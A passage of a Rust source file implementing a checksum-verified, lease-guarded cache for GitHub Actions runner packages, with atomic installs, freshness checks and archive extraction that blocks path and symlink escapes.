        &self.version
    }

    /// The extracted package directory.
    ///
    /// **Read-only to the caller.** Every JIT runtime is a copy or a link from
    /// here (`05-infrastructure.md`), so a write into this directory reaches
    /// every runtime created afterwards. Nothing in this module can detect such
    /// a write after the fact; see the module documentation's seam contract.
    #[must_use]
    pub fn root(&self) -> &Path {
        &self.root
    }

    /// When this entry landed. The freshness deadline runs from here — see
    /// [`PackageCache::is_stale`] for why install time is the honest proxy for
    /// the moment the version was superseded.
    #[must_use]
    pub const fn installed_at(&self) -> Timestamp {
        self.installed_at
    }

    /// The digest that was verified before extraction.
    #[must_use]
    pub const fn digest(&self) -> &Sha256Hex {
        &self.digest
    }
}

/// The on-disk manifest, written inside the staging directory so that it lands
/// with the entry in one rename.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct Manifest {
    version: RunnerVersion,
    digest: Sha256Hex,
    installed_at: Timestamp,
    /// The published filename the entry was built from. Diagnostic only.
    filename: String,
}

// ---------------------------------------------------------------------------
// PackageCache
// ---------------------------------------------------------------------------

/// The ports [`PackageCache`] reaches the world through.
pub struct CachePorts {
    pub catalog: Arc<dyn DownloadCatalog>,
    pub fetcher: Arc<dyn PackageFetcher>,
    pub backoff: Arc<dyn Backoff>,
    pub clock: Arc<dyn Clock>,
}

impl fmt::Debug for CachePorts {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("CachePorts")
            .field("catalog", &self.catalog)
            .field("fetcher", &self.fetcher)
            .field("backoff", &self.backoff)
            .field("clock", &self.clock)
            .finish()
    }
}

/// The versioned, immutable, checksum-verified runner package cache.
#[derive(Debug)]
pub struct PackageCache {
    root: PathBuf,
    tool_cache: PathBuf,
    os: Os,
    arch: Arch,
    ports: CachePorts,
    pins: PinnedDigests,
    freshness: Freshness,
    retry_budget: u32,
    /// When the published version was last resolved successfully.
    ///
    /// Held in memory rather than on disk on purpose: a restart forcing a
    /// re-check is the *correct* behaviour — the agent has no idea how long it
    /// was down — so persisting this would only buy the ability to skip a check
    /// that should not be skipped.
    last_check: Mutex<Option<Timestamp>>,
}

impl PackageCache {
    /// Build a cache rooted under `paths`, for a host running `os`/`arch`.
    ///
    /// `os` and `arch` are parameters rather than probed here, following
    /// `d1`'s pattern: `runner_manager_platform::os::detect_host` is called once
    /// at the composition edge, and everything below takes the pair as a value.
    /// That is the whole injection seam — there is no host-probe trait — and it
    /// is what lets a Linux CI leg exercise the Windows selection path.
    #[must_use]
    pub fn new(paths: &AppPaths, os: Os, arch: Arch, ports: CachePorts) -> Self {
        Self {
            root: paths.state_dir().join(PACKAGES_DIR),
            tool_cache: paths.state_dir().join(TOOL_CACHE_DIR),
            os,
            arch,
            ports,
            pins: PinnedDigests::new(),
            freshness: Freshness::default(),
            retry_budget: RETRY_BUDGET,
            last_check: Mutex::new(None),
        }
    }

    #[must_use]
    pub fn with_pins(mut self, pins: PinnedDigests) -> Self {
        self.pins = pins;
        self
    }

    #[must_use]
    pub const fn with_freshness(mut self, freshness: Freshness) -> Self {
        self.freshness = freshness;
        self
    }

    /// Override the retry budget. Zero is rejected in favour of one attempt,
    /// because a cache that never attempts anything is not a cache.
    #[must_use]
    pub const fn with_retry_budget(mut self, budget: u32) -> Self {
        self.retry_budget = if budget == 0 { 1 } else { budget };
        self
    }

    /// The cache root. Nothing outside this module writes here.
    #[must_use]
    pub fn root(&self) -> &Path {
        &self.root
    }

    /// Where approved tool caches are retained.
    ///
    /// A sibling of the package entries, not a child: an entry is immutable and
    /// a tool cache is by definition written to. Both are retained across
    /// attempts, and both are outside [`AppPaths::runtime_dir`], which is where
    /// disposable job workspaces live — that is the separation
    /// `05-infrastructure.md` asks for.
    #[must_use]
    pub fn tool_cache_dir(&self) -> &Path {
        &self.tool_cache
    }

    // -- installation ------------------------------------------------------

    /// Make a verified runner package available, and answer which one.
    ///
    /// **This is the cold-start path.** It decides three things in order:
    ///
    /// 1. Is this host one the product documents? An undocumented pair is
    ///    refused here, before the catalog is consulted and long before
    ///    anything is downloaded.
    /// 2. Is a check due? The published version is re-checked on
    ///    [`Freshness::check_interval`], and always when the cache is empty. A
    ///    cold start inside that interval reuses what a previous one resolved,
    ///    which is what "a bounded interval" buys.
    /// 3. Is what we hold still good enough? See [`Self::is_stale`].
    ///
    /// # Errors
    /// Any [`PackageError`]. A terminal one is returned on the spot and spends
    /// none of the retry budget; a retryable one is retried up to
    /// [`Self::with_retry_budget`] times and then wrapped in
    /// [`PackageError::Exhausted`].
    pub async fn ensure_installed(&self) -> Result<InstalledPackage, PackageError> {
        // Before the catalog, before the fetcher, before anything touches the
        // network: an unsupported pair has no package and never will.
        host_os::validate(self.os, self.arch)?;

        let now = self.ports.clock.now();
        if !self.check_is_due(now)?
            && let Some(entry) = self.newest_installed()?
        {
            return Ok(entry);
        }

        let mut last: Option<PackageError> = None;
        for attempt in 1..=self.retry_budget {
            match self.install_once().await {
                Ok(package) => {
                    *self
                        .last_check
                        .lock()
                        .unwrap_or_else(std::sync::PoisonError::into_inner) =
                        Some(self.ports.clock.now());
                    return Ok(package);
                }
                Err(error) if error.is_terminal() => return Err(error),
                Err(error) => {
                    last = Some(error);
                    if attempt < self.retry_budget {
                        self.ports.backoff.wait(attempt).await;
                    }
                }
            }
        }
        Err(PackageError::Exhausted {
            attempts: self.retry_budget,
            source: Box::new(last.expect("a spent budget leaves a failure behind")),
        })
    }

    /// Whether a cached entry has fallen outside the freshness window.
    ///
    /// # Why install time, and why this is the fail-closed direction
    ///
    /// GitHub's rule is about the *release*: a runner more than
    /// [`FRESHNESS_WINDOW_DAYS`] days behind the latest one is refused. The
    /// agent cannot see release dates — GitHub's runner-downloads response
    /// carries no version field, let alone a publication timestamp — so the
    /// supersession moment has to be bounded rather than read.
    ///
    /// It can be bounded exactly. This cache only ever installs the version
    /// GitHub was publishing at the time, so an entry installed at `T` *was*
    /// the latest release at `T`. Whatever superseded it did so at some
    /// `R >= T`, hence `now - R <= now - T`. So:
    ///
    /// * `now - T <= window` proves `now - R <= window`: the entry cannot be
    ///   past the deadline, and reusing it is safe.
    /// * `now - T > window` proves nothing either way, so the entry is treated
    ///   as stale and refreshed.
    ///
    /// The error is therefore always toward refreshing early, never toward
    /// running a package GitHub will refuse. Refreshing early costs a download;
    /// refreshing late costs every job on the host, for a reason the operator
    /// has no way to guess.
    #[must_use]
    pub fn is_stale(&self, package: &InstalledPackage, now: Timestamp) -> bool {
        now.signed_duration_since(package.installed_at) > self.freshness.window
    }

    /// Whether the published version is due to be re-checked.
    ///
    /// Three ways to answer yes, and the third is the one that matters:
    ///
    /// 1. The cache is empty, so there is nothing to reuse.
    /// 2. [`Freshness::check_interval`] has elapsed — the bounded interval
    ///    `05-infrastructure.md` asks for.
    /// 3. **What we hold is already past the freshness deadline.** A stale entry
    ///    forces a check on every cold start regardless of the interval, because
    ///    the interval exists to save REST budget and there is no budget worth
    ///    saving once the package on disk is one GitHub may refuse. The interval
    ///    being far shorter than the window makes this rare in practice; it is
    ///    written down so that the rare case is the safe one rather than the
    ///    unconsidered one.
    fn check_is_due(&self, now: Timestamp) -> Result<bool, PackageError> {
        let Some(newest) = self.newest_installed()? else {
            return Ok(true);
        };
        if self.is_stale(&newest, now) {
            return Ok(true);
        }
        let last = *self
            .last_check
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        Ok(match last {
            None => true,
            Some(at) => now.signed_duration_since(at) >= self.freshness.check_interval,
        })
    }

    /// One attempt: resolve, decide, and install if a download is warranted.
    async fn install_once(&self) -> Result<InstalledPackage, PackageError> {
        let published = self.ports.catalog.published().await?;

        // Selection: this host's OS and architecture, from GitHub's metadata.
        // `select` answering `None` is refused rather than fallen back from —
        // a hardcoded URL is the substitution `07-security.md` names as the
        // threat.
        let download =
            published
                .select(self.os, self.arch)
                .ok_or(PackageError::NoPackagePublished {
                    os: self.os,
                    arch: self.arch,
                })?;
        let version = RunnerVersion::from_filename(&download.filename)?;

        // Already held: no fetch, no extraction, no rewrite.
        if let Some(entry) = self.entry(&version)? {
            return Ok(entry);
        }

        // A different version is published. Whether that warrants 150-300 MB is
        // the freshness question, and only that question.
        let now = self.ports.clock.now();
        if let Some(newest) = self.newest_installed()?
            && !self.is_stale(&newest, now)
        {
            return Ok(newest);
        }

        let digest = self.required_digest(download, &version)?;
        self.download_verify_and_install(download, &version, &digest, now)
            .await
    }

    /// The digest that must match, or a refusal.
    ///
    /// This is the fail-closed gate. `sha256_checksum` is optional in GitHub's
    /// schema, and the only two acceptable outcomes when it is unusable are an
    /// operator-pinned digest or a refusal to install. There is no third.
    ///
    /// # Every unusable shape routes to the same remedy
    ///
    /// Absent, empty, and *malformed* are all "GitHub did not give me a digest
    /// I can check", and all three fall through to the pin. Malformed used to
    /// return immediately instead, which produced a refusal whose message told
    /// the operator to pin a digest — down a path where a pin was never
    /// consulted. A security refusal that names a remedy has to name one that
    /// works, or the operator does the work and watches it fail again.
    fn required_digest(
        &self,
        download: &RunnerDownload,
        version: &RunnerVersion,
    ) -> Result<Sha256Hex, PackageError> {
        let published = match download.sha256_checksum() {
            None => PublishedChecksum::Absent,
            Some(raw) if raw.trim().is_empty() => PublishedChecksum::Empty,
            Some(raw) => match Sha256Hex::parse(raw) {
                Ok(digest) => return Ok(digest),
                Err(_) => PublishedChecksum::Malformed,
            },
        };
        match self.pins.get(version) {
            Some(pinned) => Ok(pinned.clone()),
            None => Err(PackageError::ChecksumAbsent {
                version: version.clone(),
                os: self.os,
                arch: self.arch,
                published,
            }),
        }
    }

    /// Fetch, verify, extract, commit. In that order, without exception.
    ///
    /// # Why the downloaded file is not inside the guarded staging directory
    ///
    /// [`StagingGuard`] covers the *extraction* directory from the point the
    /// archive has been verified and unpacked to the point the entry lands —
    /// the manifest write and the rename. It does **not** cover a fetch,
    /// verification or extraction failure: the guard is not constructed until
    /// after those succeed, so a half-unpacked tree from one of them is left
    /// for [`Self::sweep_staging`] rather than unwound here. That is a
    /// deliberately narrow reach, and stating it wider than it is would be the
    /// sort of claim a reader relies on and a crash disproves.
    ///
    /// Putting the download under that directory would have made "the partially
    /// downloaded file is removed" true for a reason no test could distinguish
    /// from tidying up — the guard would remove the archive on the paths it
    /// does cover, whether or not the mismatch path ever did, so deleting the
    /// removal would not turn any test red. The archive therefore lives
    /// beside the extraction directory with its lifetime managed explicitly, at
    /// exactly one place below, and [`Self::sweep_staging`] is the backstop for
    /// a crash rather than the mechanism.
    async fn download_verify_and_install(
        &self,
        download: &RunnerDownload,
        version: &RunnerVersion,
        expected: &Sha256Hex,
        now: Timestamp,
    ) -> Result<InstalledPackage, PackageError> {
        let (_, kind) = ArchiveKind::split(&download.filename)?;
        let staging_root = self.staging_root();
        create_dir_all(&staging_root)?;
        let token = uuid::Uuid::new_v4();
        let archive = staging_root.join(format!("download-{token}.archive"));
        let extracted = staging_root.join(token.to_string());

        let outcome = self
            .fetch_verify_extract(download, version, expected, kind, &archive, &extracted)
            .await;

        // The downloaded file is not part of an entry on ANY path out of here —
        // verified, unverified, or interrupted mid-extraction. One removal,
        // reached unconditionally, is what makes that a property rather than a
        // hope spread over four early returns.
        let removed = remove_file_if_present(&archive, "remove the package download");
        let () = outcome?;
        removed?;

        let guard = StagingGuard::new(extracted.clone());
        let manifest = Manifest {
            version: version.clone(),
            digest: expected.clone(),
            installed_at: now,
            filename: download.filename.clone(),
        };
        write_json(&extracted.join(MANIFEST_FILE), &manifest)?;

        let target = self.version_dir(version);
        create_dir_all(&self.root)?;

        // The single commit point. `rename` onto an existing directory fails on
        // Windows and replaces nothing on Unix, and either way the answer is the
        // same: someone already installed this version, and an installed entry
        // is never overwritten.
        match fs::rename(&extracted, &target) {
            Ok(()) => {}
            Err(source) => {
                if let Some(entry) = self.entry(version)? {
                    guard.disarm_into_sweep();
                    return Ok(entry);
                }
                return Err(PackageError::Io {
                    what: "commit the extracted runner package",
                    path: target,
                    source,
                });
            }
        }
        guard.disarm_into_sweep();

        Ok(InstalledPackage {
            version: version.clone(),
            root: target,
            installed_at: now,
            digest: expected.clone(),
        })
    }

    /// Everything between the fetch and the commit: the ordering this module
    /// exists to enforce.
    ///
    /// Split out from its caller so that the downloaded file has exactly one
    /// removal site regardless of which of these steps failed.
    async fn fetch_verify_extract(
        &self,
        download: &RunnerDownload,
        version: &RunnerVersion,
        expected: &Sha256Hex,
        kind: ArchiveKind,
        archive: &Path,
        extracted: &Path,
    ) -> Result<(), PackageError> {
        self.ports
            .fetcher
            .fetch(&download.download_url, archive)
            .await?;

        // Verification, before extraction. Nothing between these two statements
        // may ever unpack anything.
        let archive_for_hash = archive.to_path_buf();
        let actual = tokio::task::spawn_blocking(move || sha256_file(&archive_for_hash))
            .await
            .map_err(|error| PackageError::Extract {
                detail: format!("the verification task failed: {error}"),
            })??;

        if actual != *expected {
            return Err(PackageError::ChecksumMismatch {
                version: version.clone(),
                expected: expected.clone(),
                actual,
            });
        }

        let archive_for_extract = archive.to_path_buf();
        let extracted_for_task = extracted.to_path_buf();
        tokio::task::spawn_blocking(move || {
            extract(&archive_for_extract, kind, &extracted_for_task)
        })
        .await
        .map_err(|error| PackageError::Extract {
            detail: format!("the extraction task failed: {error}"),
        })?
    }

    // -- reading the cache -------------------------------------------------

    fn version_dir(&self, version: &RunnerVersion) -> PathBuf {
        self.root.join(version.as_str())
    }

    /// One entry, if it is installed and complete.
    ///
    /// A directory with no readable manifest is *not* an entry: the manifest
    /// lands with the directory in a single rename, so its absence means the
    /// directory was not produced by this module and nothing may be assumed
    /// about its contents.
    ///
    /// # Errors
    /// [`PackageError::Io`] when the cache cannot be read.
    pub fn entry(&self, version: &RunnerVersion) -> Result<Option<InstalledPackage>, PackageError> {
        let root = self.version_dir(version);
        if !root.is_dir() {
            return Ok(None);
        }
        let Some(manifest) = read_json::<Manifest>(&root.join(MANIFEST_FILE))? else {
            return Ok(None);
        };
        Ok(Some(InstalledPackage {
            version: manifest.version,
            root,
            installed_at: manifest.installed_at,
            digest: manifest.digest,
        }))
    }

    /// Every complete entry, oldest version first.
    ///
    /// # Errors
    /// [`PackageError::Io`] when the cache directory cannot be read.
    pub fn installed(&self) -> Result<Vec<InstalledPackage>, PackageError> {
        let mut found = Vec::new();
        let entries = match fs::read_dir(&self.root) {
            Ok(entries) => entries,
            Err(source) if source.kind() == io::ErrorKind::NotFound => return Ok(found),
            Err(source) => {
                return Err(PackageError::Io {
                    what: "read the runner package cache",
                    path: self.root.clone(),
                    source,
                });
            }
        };
        for entry in entries {
            let entry = entry.map_err(|source| PackageError::Io {
                what: "read the runner package cache",
                path: self.root.clone(),
                source,
            })?;
            let name = entry.file_name();
            let Some(name) = name.to_str() else { continue };
            // `.staging` and `.leases` are not versions, and `RunnerVersion`
            // could not parse them anyway; skipping them explicitly keeps the
            // intent visible.
            if name.starts_with('.') {
                continue;
            }
            let Ok(version) = RunnerVersion::parse(name) else {
                continue;
            };
            if let Some(package) = self.entry(&version)? {
                found.push(package);
            }
        }
        found.sort_by(|a, b| a.version.cmp(&b.version));
        Ok(found)
    }

    /// The most recently installed entry, which is the one a cold start reuses.
    fn newest_installed(&self) -> Result<Option<InstalledPackage>, PackageError> {
        Ok(self
            .installed()?
            .into_iter()
            .max_by_key(|package| package.installed_at))
    }

    // -- leases and pruning ------------------------------------------------

    fn leases_dir(&self) -> PathBuf {
        self.root.join(LEASES_DIR)
    }

    fn lease_path(&self, attempt: AttemptId) -> PathBuf {
        self.leases_dir()
            .join(format!("{attempt}.{LEASE_EXTENSION}"))
    }

    /// Record that `attempt` holds `version`, so a prune cannot remove it.
    ///
    /// Two refusals, both structural:
    ///
    /// * A version that is not installed cannot be held.
    /// * An attempt whose runtime directory is **inside the cache root** is
    ///   refused outright. Job workspaces are disposable and per-attempt; a
    ///   package entry is shared and immutable. A workspace nested in one would
    ///   be destroyed the moment that version was pruned, and would mutate an
    ///   entry that every other runtime is copied from. This is checked rather
    ///   than documented because a documented invariant with no enforcement is
    ///   how the property silently stops holding.
    ///
    /// The lease survives a restart — it is a file, not a field — which is what
    /// makes the guard meaningful across the agent's own lifetime.
    ///
    /// # Errors
    /// [`PackageError::NotInstalled`], [`PackageError::WorkspaceInsideCache`],
    /// or [`PackageError::Io`].
    pub fn lease(
        &self,
        attempt: &RunnerAttempt,
        version: &RunnerVersion,
    ) -> Result<(), PackageError> {
        if self.entry(version)?.is_none() {
            return Err(PackageError::NotInstalled {
                version: version.clone(),
            });
        }
        let runtime = attempt.runtime_path();
        if is_inside(&self.root, runtime) {
            return Err(PackageError::WorkspaceInsideCache {
                attempt: attempt.id,
                path: runtime.to_path_buf(),
            });
        }
        create_dir_all(&self.leases_dir())?;
        write_json(
            &self.lease_path(attempt.id),
            &Lease {
                version: version.clone(),
            },
        )
    }

    /// Drop `attempt`'s hold, whatever it was holding.
    ///
    /// Idempotent: releasing a lease that was never taken is not an error, so a
    /// cleanup path may call it unconditionally.
    ///
    /// # Errors
    /// [`PackageError::Io`] when the lease file cannot be removed.
    pub fn release(&self, attempt: AttemptId) -> Result<(), PackageError> {
        let path = self.lease_path(attempt);
        match fs::remove_file(&path) {
            Ok(()) => Ok(()),
            Err(source) if source.kind() == io::ErrorKind::NotFound => Ok(()),
            Err(source) => Err(PackageError::Io {
                what: "release a runner package lease",
                path,
                source,
            }),
        }
    }

    /// Every attempt currently holding `version`.
    ///
    /// # Errors
    /// [`PackageError::Io`] when the lease directory cannot be read.
    pub fn holders(&self, version: &RunnerVersion) -> Result<Vec<AttemptId>, PackageError> {
        let mut holders = Vec::new();
        let dir = self.leases_dir();
        let entries = match fs::read_dir(&dir) {
            Ok(entries) => entries,
            Err(source) if source.kind() == io::ErrorKind::NotFound => return Ok(holders),
            Err(source) => {
                return Err(PackageError::Io {
                    what: "read the runner package leases",
                    path: dir,
                    source,
                });
            }
        };
        for entry in entries {
            let entry = entry.map_err(|source| PackageError::Io {
                what: "read the runner package leases",
                path: dir.clone(),
                source,
            })?;
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some(LEASE_EXTENSION) {
                continue;
            }
            // Everything below refuses rather than skips.
            //
            // A `.lease` file this module cannot make sense of is not "no
            // lease" — it is a lease whose holder is unknown, and treating the
            // two alike is the one fail-OPEN path in an otherwise fail-closed
            // guard. It would also be among the easiest to reach: a lease is
            // written non-atomically, so a crash mid-write leaves exactly this
            // shape, and the consequence is deleting the package a live runner
            // is executing from.
            let unreadable = || PackageError::UnreadableLease { path: path.clone() };
            let uuid = path
                .file_stem()
                .and_then(|stem| stem.to_str())
                .and_then(|stem| uuid::Uuid::parse_str(stem).ok())
                .ok_or_else(unreadable)?;
            let lease = read_lease(&path)?.ok_or_else(unreadable)?;
            if lease.version == *version {
                holders.push(AttemptId::from_uuid(uuid));
            }
        }
        holders.sort_unstable();
        Ok(holders)
    }

    /// Remove a cached version, if nothing active still references it.
    ///
    /// `attempts` is the host's attempt set — the same set
    /// `RunnerLauncher::attempts` answers, terminal entries included, because
    /// both questions are asked of one set. Each lease on `version` is resolved
    /// against it:
    ///
    /// | Lease's attempt | Outcome |
    /// |---|---|
    /// | present and non-terminal | **refused** — [`PackageError::VersionInUse`] |
    /// | present and terminal | released, and the prune proceeds |
    /// | absent from the set | **refused** — [`PackageError::VersionHeldByUnknownAttempt`] |
    ///
    /// # Why an absent attempt refuses rather than releases
    ///
    /// It would be tidier to read "not in the set" as "gone", and it would be
    /// wrong. `e1` documents that a launcher's newly created attempt may not be
    /// visible to `attempts()` yet — a journal write that has not landed, an
    /// asynchronous store, a cache — and that lag is exactly the window in
    /// which a just-leased version would look unreferenced. Deleting a package
    /// out from under a starting runner is not a condition the runner can
    /// report intelligibly, so the ambiguous case fails closed. The cost is a
    /// version that stays on disk until [`Self::release`] is called for a lease
    /// nobody will ever release; the error names that remedy.
    ///
    /// **The guard is only as truthful as the caller's leases.** This function
    /// can refuse to prune something it knows is held; it cannot discover a
    /// reference nobody recorded. See the module documentation's seam contract.
    ///
    /// # A window this function does not close, recorded deliberately
    ///
    /// [`Self::lease`] and this method both take `&self` on a `Send + Sync`
    /// type and take no lock between them. A `lease` that passes its own
    /// `entry()` check can therefore be written *after* this method has read
    /// [`Self::holders`] and *before* it removes the directory, leaving a live
    /// attempt holding a package that is gone. Nothing here detects that.
    ///
    /// It is not closed with a lock of this module's own, because a second lock
    /// beside `e1`'s host allocation lock is a second ordering to get wrong.
    /// **The caller must prune under the same host-wide allocation lock it
    /// launches under** — that lock already serialises the launch that takes a
    /// lease, so holding it here makes the read-then-remove indivisible with
    /// respect to every lease this agent creates. It does not protect against a
    /// second agent on the same machine, which the single-instance lock is
    /// there to prevent.
    ///
    /// Stated rather than silently assumed: an unstated locking requirement is
    /// exactly the shape of defect `e1` reported when a caller was left to
    /// supply an attempt set separately from the thing that created it.
    ///
    /// # Errors
    /// [`PackageError::VersionInUse`],
    /// [`PackageError::VersionHeldByUnknownAttempt`],
    /// [`PackageError::NotInstalled`], or [`PackageError::Io`].
    pub fn prune(
        &self,
        version: &RunnerVersion,
        attempts: &[RunnerAttempt],
    ) -> Result<(), PackageError> {
        if self.entry(version)?.is_none() {
            return Err(PackageError::NotInstalled {
                version: version.clone(),
            });
        }
        let holders = self.holders(version)?;
        for holder in &holders {
            match attempts.iter().find(|attempt| attempt.id == *holder) {
                Some(attempt) if !attempt.is_terminal() => {
                    return Err(PackageError::VersionInUse {
                        version: version.clone(),
                        attempt: *holder,
                        state: attempt.state(),
                    });
                }
                Some(_) => {}
                None => {
                    return Err(PackageError::VersionHeldByUnknownAttempt {
                        version: version.clone(),
                        attempt: *holder,
                    });
                }
            }
        }

        let dir = self.version_dir(version);
        fs::remove_dir_all(&dir).map_err(|source| PackageError::Io {
            what: "remove a cached runner package",
            path: dir,
            source,
        })?;
        // The holders were all terminal, so their leases are spent.
        for holder in holders {
            self.release(holder)?;
        }
        Ok(())
    }

    // -- staging -----------------------------------------------------------

    fn staging_root(&self) -> PathBuf {
        self.root.join(STAGING_DIR)
    }

    /// Remove staging litter left by an interrupted install.
    ///
    /// Nothing under `.staging/` is ever part of an entry, so this is always
    /// safe to call. It is separate from installing because a sweep that ran
    /// automatically would race a concurrent install's staging directory.
    ///
    /// # Errors
    /// [`PackageError::Io`] when the staging root cannot be read.
    pub fn sweep_staging(&self) -> Result<usize, PackageError> {
        let root = self.staging_root();
        let entries = match fs::read_dir(&root) {
            Ok(entries) => entries,
            Err(source) if source.kind() == io::ErrorKind::NotFound => return Ok(0),
            Err(source) => {
                return Err(PackageError::Io {
                    what: "read the runner package staging area",
                    path: root,
                    source,
                });
            }
        };
        let mut swept = 0;
        for entry in entries.flatten() {
            let path = entry.path();
            // Both shapes live here: `download-<uuid>.archive` files and
            // `<uuid>/` extraction directories.
            let removed = if path.is_dir() {
                fs::remove_dir_all(&path).is_ok()
            } else {
                fs::remove_file(&path).is_ok()
            };
            if removed {
                swept += 1;
            }
        }
        Ok(swept)
    }
}

/// One attempt's hold on one version.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct Lease {
    version: RunnerVersion,
}

/// Removes a staging directory unless the install committed it.
struct StagingGuard {
    dir: Option<PathBuf>,
}

impl StagingGuard {
    fn new(dir: PathBuf) -> Self {
        Self { dir: Some(dir) }
    }

    /// The entry landed (or was already there); the staging directory is now
    /// ordinary litter and is removed on the spot rather than on unwind.
    fn disarm_into_sweep(mut self) {
        if let Some(dir) = self.dir.take() {
            let _ = fs::remove_dir_all(dir);
        }
    }
}

impl Drop for StagingGuard {
    fn drop(&mut self) {
        if let Some(dir) = self.dir.take() {
            let _ = fs::remove_dir_all(dir);
        }
    }
}

// ---------------------------------------------------------------------------
// Extraction
// ---------------------------------------------------------------------------

/// Extract a verified archive into a fresh directory.
///
/// The digest has already matched by the time this runs, so these are the bytes
/// GitHub published. The containment checks below are defence in depth, not the
/// primary control — but they are cheap, and what they prevent is an archive
/// writing outside the directory it was given.
fn extract(archive: &Path, kind: ArchiveKind, into: &Path) -> Result<(), PackageError> {
    create_dir_all(into)?;
    match kind {
        ArchiveKind::Zip => extract_zip(archive, into),
        ArchiveKind::TarGz => extract_tar_gz(archive, into),
    }
}

fn extract_zip(archive: &Path, into: &Path) -> Result<(), PackageError> {
    let file = fs::File::open(archive).map_err(|source| PackageError::Io {
        what: "open the runner package archive",
        path: archive.to_path_buf(),
        source,
    })?;
    let mut zip = zip::ZipArchive::new(file).map_err(|error| PackageError::Extract {
        detail: error.to_string(),
    })?;

    for index in 0..zip.len() {
        let mut entry = zip.by_index(index).map_err(|error| PackageError::Extract {
            detail: error.to_string(),
        })?;
        let raw_name = entry.name().to_string();
        // `enclosed_name` answers `None` for an absolute path, a drive prefix,
        // or any `..` component. Our own containment check follows it because
        // the two disagree on nothing and agreeing twice is the point.
        let relative = entry
            .enclosed_name()
            .ok_or_else(|| PackageError::UnsafeArchiveEntry {
                entry: raw_name.clone(),
            })?;
        let destination = resolve_inside(into, &relative, &raw_name)?;

        if entry.is_dir() {
            create_dir_all(&destination)?;
            continue;
        }
        if entry.is_symlink() {
            // Windows packages are the `.zip` ones and contain no symlinks. A
            // link here would be a shape this agent has never seen from GitHub,
            // and creating it needs a privilege the agent should not want.
            return Err(PackageError::UnsafeArchiveEntry { entry: raw_name });
        }
        if let Some(parent) = destination.parent() {
            create_dir_all(parent)?;
        }
        let mut out = fs::File::create(&destination).map_err(|source| PackageError::Io {
            what: "create an extracted runner package file",
            path: destination.clone(),
            source,
        })?;
        io::copy(&mut entry, &mut out).map_err(|source| PackageError::Io {
            what: "write an extracted runner package file",
            path: destination.clone(),
            source,
        })?;
        apply_mode_policy(&destination, entry.unix_mode())?;
    }
    Ok(())
}

fn extract_tar_gz(archive: &Path, into: &Path) -> Result<(), PackageError> {
    let file = fs::File::open(archive).map_err(|source| PackageError::Io {
        what: "open the runner package archive",
        path: archive.to_path_buf(),
        source,
    })?;
    let mut tar = tar::Archive::new(flate2::read::GzDecoder::new(file));
    let entries = tar.entries().map_err(|source| PackageError::Extract {
        detail: source.to_string(),
    })?;
    for entry in entries {
        let mut entry = entry.map_err(|source| PackageError::Extract {
            detail: source.to_string(),
        })?;

        // Everything is read out of the header up front: `entry` is borrowed
        // mutably below, and a `Cow` borrowed from it cannot survive that.
        let relative = entry
            .path()
            .map_err(|source| PackageError::Extract {
                detail: source.to_string(),
            })?
            .into_owned();
        let display = relative.display().to_string();
        let kind = entry.header().entry_type();
        let mode = entry
            .header()
            .mode()
            .map_err(|source| PackageError::Extract {
                detail: source.to_string(),
            })?;
        let link_target = entry
            .link_name()
            .map_err(|source| PackageError::Extract {
                detail: source.to_string(),
            })?
            .map(|target| target.into_owned());

        // This module's own containment check, before `tar`'s. Its result is
        // load-bearing rather than discarded: `destination` is what the mode
        // policy is applied to below, so removing this call does not compile.
        let destination = resolve_inside(into, &relative, &display)?;

        // A link's *target* is a second path, and `tar` does not check it
        // against the extraction root. An unvalidated one is the classic
        // archive escape: a link out of the tree, then a later entry written
        // through it. `extract_zip` refuses links outright because a Windows
        // package has never carried one and creating one needs a privilege
        // this agent should not want. That reasoning is Windows-specific, so
        // rather than copy the conclusion this path checks the target: a link
        // that stays inside the package is legitimate on Unix and is kept, and
        // one that reaches outside is refused.
        if matches!(kind, tar::EntryType::Symlink | tar::EntryType::Link) {
            let target =
                link_target
                    .as_deref()
                    .ok_or_else(|| PackageError::UnsafeArchiveEntry {
                        entry: display.clone(),
                    })?;
            resolve_link_target(into, &destination, kind, target, &display)?;
        }

        // `tar`'s own mode handling has to be turned *down* here, not up.
        //
        // `set_preserve_permissions(true)` is weaker than the default, not
        // stronger: `Entry::_set_perms` computes
        // `let mode = if preserve { mode } else { mode & 0o777 }; mode & !mask`
        // with `mask` defaulting to zero, so preserving applies setuid, setgid,
        // sticky and world-writable bits exactly as published. On a package
        // fetched over the network that is the wrong direction. `false` drops
        // the top three bits and the mask drops every group and other bit, so
        // nothing dangerous exists on disk even momentarily; the policy below
        // then sets the mode this agent actually intends.
        entry.set_preserve_permissions(false);
        entry.set_mask(0o077);
        let unpacked = entry
            .unpack_in(into)
            .map_err(|source| PackageError::Extract {
                detail: source.to_string(),
            })?;
        if !unpacked {
            return Err(PackageError::UnsafeArchiveEntry { entry: display });
        }

        // Links are skipped: a symlink's own mode is meaningless, and
        // `set_permissions` follows the link and would change the target's.
        if !matches!(kind, tar::EntryType::Symlink | tar::EntryType::Link) {
            apply_mode_policy(&destination, Some(mode))?;
        }
    }
    Ok(())
}

/// Prove an archive link's target cannot reach outside the package.
///
/// A symlink's target is resolved relative to the link's own directory; a hard
/// link's is relative to the archive root. Both must land inside `into`, and an
/// absolute target is refused outright — nothing GitHub publishes needs one,
/// and it is the shape an escape takes.
fn resolve_link_target(
    into: &Path,
    entry_destination: &Path,
    kind: tar::EntryType,
    target: &Path,
    raw: &str,
) -> Result<(), PackageError> {
    let unsafe_entry = || PackageError::UnsafeArchiveEntry {
        entry: raw.to_string(),
    };
    if target.is_absolute() {
        return Err(unsafe_entry());
    }
    let mut resolved = if matches!(kind, tar::EntryType::Symlink) {
        entry_destination.parent().unwrap_or(into).to_path_buf()
    } else {
        into.to_path_buf()
    };
    for component in target.components() {
        match component {
            Component::Normal(part) => resolved.push(part),
            Component::CurDir => {}
            // Climbing is legitimate inside a package — `bin/current` may point
            // at `../run.sh` — so it is followed rather than refused, and the
            // containment check below is what decides.
            Component::ParentDir => {
                if !resolved.pop() {
                    return Err(unsafe_entry());
                }
            }
            Component::RootDir | Component::Prefix(_) => return Err(unsafe_entry()),
        }
    }
    if !is_inside(into, &resolved) {
        return Err(unsafe_entry());
    }
    Ok(())
}

/// Join `relative` onto `root` and prove the result stays inside it.
